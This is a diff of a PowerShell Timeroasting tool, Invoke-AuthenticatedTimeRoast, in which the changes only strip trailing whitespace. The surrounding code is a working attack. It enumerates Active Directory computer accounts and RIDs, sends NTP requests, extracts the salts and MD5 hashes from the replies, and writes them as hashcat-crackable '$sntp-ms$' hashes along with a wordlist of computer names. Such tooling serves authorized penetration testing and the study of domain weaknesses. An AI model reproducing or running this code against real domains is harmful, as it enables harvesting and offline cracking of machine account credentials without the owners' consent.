@@ -57,7 +57,7 @@ Function Invoke-AuthenticatedTimeRoast {
 
     if ($OutputFile) { Out-Null > $OutputFile }
 
-    if ($SourcePort) { $Client = New-Object System.Net.Sockets.UdpClient($SourcePort)} 
+    if ($SourcePort) { $Client = New-Object System.Net.Sockets.UdpClient($SourcePort)}
     else { $Client = New-Object System.Net.Sockets.UdpClient }
 
     $Client.Client.ReceiveTimeout = [Math]::Floor(1000 / $Rate)
@@ -74,9 +74,9 @@ Function Invoke-AuthenticatedTimeRoast {
 
         $Computers = @()
         foreach ($Result in $Searcher.FindAll()) {
-            
+
             try {
-                
+
                 $SamAccountName = $Result.Properties["sAMAccountName"][0]
                 $Sid = New-Object System.Security.Principal.SecurityIdentifier($Result.Properties["objectsid"][0], 0)
                 $Rid = [int]$Sid.Value.Split("-")[-1]
@@ -86,7 +86,7 @@ Function Invoke-AuthenticatedTimeRoast {
                     RID  = $Rid
                 }
             }
-            
+
             catch { continue }
         }
 
@@ -99,12 +99,12 @@ Function Invoke-AuthenticatedTimeRoast {
     if ($GenerateWordlist) {
         $WordlistPath = "wordlist.txt"
         foreach ($Computer in $Computers) {
-            
+
             $Name = $Computer.Name.TrimEnd('$').ToLower()
             $Name | Out-File -Append -FilePath $WordlistPath -Encoding "ascii"
-        
+
         }
-        
+
         Write-Output "[*] Wordlist written to $PWD\$WordlistPath"
     }
 
@@ -118,14 +118,14 @@ Function Invoke-AuthenticatedTimeRoast {
             $Reply = $Client.Receive([ref]$null)
 
             if ($Reply.Length -eq 68) {
-                
+
                 $Salt = [byte[]]$Reply[0..47]
                 $Md5Hash = [byte[]]$Reply[-16..-1]
                 $AnswerRid = [BitConverter]::ToUInt32($Reply[-20..-16], 0)
 
                 $HexSalt = [BitConverter]::ToString($Salt).Replace("-", "").ToLower()
                 $HexHash = [BitConverter]::ToString($Md5Hash).Replace("-", "").ToLower()
-                
+
                 $ComputerHostname = $Computer.Name.TrimEnd('$')
                 $HashcatHash = "$ComputerHostname`:`$sntp-ms`${0}`${1}" -f $HexHash, $HexSalt
 
@@ -135,7 +135,7 @@ Function Invoke-AuthenticatedTimeRoast {
                 $TimeoutTime = (Get-Date).AddSeconds($Timeout)
             }
         }
-        
+
         catch { continue }
     }
 
